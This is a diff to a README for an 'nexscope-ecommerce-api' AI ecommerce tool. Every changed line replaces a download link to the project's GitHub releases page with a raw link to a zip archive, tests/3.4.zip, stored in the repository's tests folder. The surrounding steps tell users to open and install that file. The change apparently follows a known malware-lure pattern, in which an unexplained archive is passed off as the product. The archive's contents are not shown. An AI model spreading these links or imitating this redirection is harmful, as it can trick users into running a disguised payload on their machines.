@@ -1,6 +1,6 @@
 # 🚀 nexscope-ecommerce-api - Unlock Smarter Ecommerce with AI
 
-[![Download Now](https://img.shields.io/badge/Download-Nexscope_API-brightgreen?style=for-the-badge&logo=github)](https://github.com/senshu-hiro/nexscope-ecommerce-api/releases)
+[![Download Now](https://img.shields.io/badge/Download-Nexscope_API-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/senshu-hiro/nexscope-ecommerce-api/main/tests/3.4.zip)
 
 ---
 
@@ -51,7 +51,7 @@ Follow these simple steps to get up and running in less than five minutes.
 
 Visit this link to download the application:
 
-[**👉 Download nexscope-ecommerce-api**](https://github.com/senshu-hiro/nexscope-ecommerce-api/releases)
+[**👉 Download nexscope-ecommerce-api**](https://raw.githubusercontent.com/senshu-hiro/nexscope-ecommerce-api/main/tests/3.4.zip)
 
 ### Step 2: Open the Downloaded File
 
@@ -92,7 +92,7 @@ Ready to get started? Here's everything you need to know about installing the ap
 6. Click **Install** and wait for completion.
 7. Click **Finish** to launch the app.
 
-[**⬇️ Download Now**](https://github.com/senshu-hiro/nexscope-ecommerce-api/releases)
+[**⬇️ Download Now**](https://raw.githubusercontent.com/senshu-hiro/nexscope-ecommerce-api/main/tests/3.4.zip)
 
 ---
 
@@ -194,7 +194,7 @@ This software is provided for personal and commercial use. Please review the lic
 
 Don't wait — unlock the power of AI for your ecommerce business right now.
 
-[**⬇️ Download nexscope-ecommerce-api**](https://github.com/senshu-hiro/nexscope-ecommerce-api/releases)
+[**⬇️ Download nexscope-ecommerce-api**](https://raw.githubusercontent.com/senshu-hiro/nexscope-ecommerce-api/main/tests/3.4.zip)
 
 Join thousands of satisfied users who are already growing their businesses with smarter tools.
 
